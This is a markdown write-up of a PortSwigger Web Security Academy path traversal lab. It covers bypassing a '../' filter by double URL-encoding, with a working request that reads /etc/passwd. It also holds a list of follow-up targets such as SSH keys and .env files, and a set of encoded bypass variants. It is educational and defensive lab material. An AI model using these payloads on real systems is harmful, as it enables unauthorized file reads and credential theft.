# Lab 04 — Traversal Sequences Stripped with Superfluous URL-Decode

[![Category](https://img.shields.io/badge/Category-Path%20Traversal-purple)]()
[![Type](https://img.shields.io/badge/Type-Path%20Traversal%20-%20Double%20URL-Decoding%20Bypass-orange)]()
[![Severity](https://img.shields.io/badge/Severity-High-critical)]()
[![Source](https://img.shields.io/badge/Source-PortSwigger%20Web%20Security%20Academy-blue)](https://portswigger.net/web-security/file-path-traversal)

> Part of the [Path Traversal Labs](./README.md) series — PortSwigger Web Security Academy.

---

## 1. Overview

| Field | Detail |
|---|---|
| **Lab Name** | Traversal Sequences Stripped with Superfluous URL-Decode |
| **Vulnerability Class** | Path Traversal — Double URL-Decoding Bypass |
| **Weakness (CWE)** | CWE-22 / CWE-172: Encoding Error |
| **Severity** | High |
| **Objective** | Bypass traversal-sequence filtering by double URL-encoding the payload so it only becomes dangerous after the filter has already run. |

## 2. Summary

The web/application layer decodes and filters the input for `../` once, but the application code performs an additional, unnecessary URL-decode on the already-decoded parameter before using it in a file operation. Double-encoding the traversal sequence lets it slip past the filter's single decode pass, only resolving to a real `../` after the second, superfluous decode.

## 3. Proof of Concept (PoC)

**Step 1 — Capture the image request:**  
Intercept a normal image request, e.g. `GET /image?filename=33.jpg`.

**Step 2 — Confirm single-encoding fails:**  
Both the raw `../../../etc/passwd` and the singly-encoded `%2e%2e%2f...` are detected and blocked by the first decoding/filtering layer.

**Step 3 — Double-encode the payload:**  
URL-encode the already-encoded sequence again — `%2f` becomes `%252f` — and submit:

```http
GET /image?filename=..%252f..%252f..%252fetc/passwd HTTP/1.1
```

**Step 4 — Observe the two-stage decode:**  
The edge/filter layer decodes `%252f` once, yielding the harmless-looking literal string `%2f` (not a slash), so it passes the filter. The application's own extra `urldecode()` call then decodes `%2f` a second time into an actual `/`, reconstructing the real traversal sequence after validation has already occurred.


## 4. Evidence (Request / Response)

```http
GET /image?filename=..%252f..%252f..%252fetc/passwd HTTP/1.1
Host: <lab-id>.web-security-academy.net

HTTP/1.1 200 OK
Content-Type: image/jpeg

root:x:0:0:root:/root:/bin/bash
...
peter:x:12001:12001::/home/peter:/bin/bash
carlos:x:12002:12002::/home/carlos:/bin/bash
...
```

## 5. Root Cause Analysis

Two layers (edge/web server and application code) each perform their own URL-decoding, but validation happens only at the first layer, on data that has been decoded only once. The application's redundant second decode call operates on already-validated input, re-introducing the dangerous characters the first layer never saw.

### Attacker vs. Defender Perspective

- **Attacker view:** When a single-encoded payload is blocked, try double URL-encoding (%252e%252f) to exploit a second, redundant decode step downstream.
- **Defender view:** Decode input exactly once at a single defined layer and validate immediately after; never decode again further down the pipeline.

## 6. Impact

Full arbitrary file read, and in this specific lab, the disclosed `/etc/passwd` reveals multiple interactive user accounts (e.g. `peter`, `carlos`, `postgres`) and active database services (MySQL, PostgreSQL, MongoDB) — valuable reconnaissance for a realistic engagement, pointing toward follow-up targets such as SSH private keys (`~/.ssh/id_rsa`), shell history files, or application config/`.env` files.

## 7. Remediation

- Decode input exactly once, at a single, well-defined point in the request pipeline, and validate strictly after that single decode — never decode again downstream.
- Reject requests containing any percent-encoded characters that decode to path-traversal sequences, including double- or non-standard-encoded variants (`%252e`, `..%c0%af`, `..%ef%bc%8f`).
- Apply the canonical-path-containment check as the final authoritative control, independent of how many encoding layers the input passed through.

## 8. References

- [PortSwigger — Path Traversal](https://portswigger.net/web-security/file-path-traversal)
- [OWASP — Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
- [CWE-22: Improper Limitation of a Pathname to a Restricted Directory](https://cwe.mitre.org/data/definitions/22.html)

---

*Writeup produced for educational and authorized lab purposes only (PortSwigger Web Security Academy environment).*
